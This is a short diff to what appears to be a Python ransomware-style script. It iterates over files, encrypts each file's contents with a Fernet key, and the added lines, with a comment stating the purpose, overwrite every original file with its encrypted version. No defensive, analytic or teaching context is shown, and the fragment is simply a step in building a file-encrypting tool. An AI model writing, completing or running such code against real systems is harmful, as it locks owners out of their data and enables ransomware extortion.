@@ -21,3 +21,6 @@ for file in files:
     with open(file, "rb") as thefile:
         contents = thefile.read()
         contents_encrypted = Fernet(key).encrypt(contents)
+# takes file opens files encryptes it and writes it back to the file as a encrypted file
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted) 
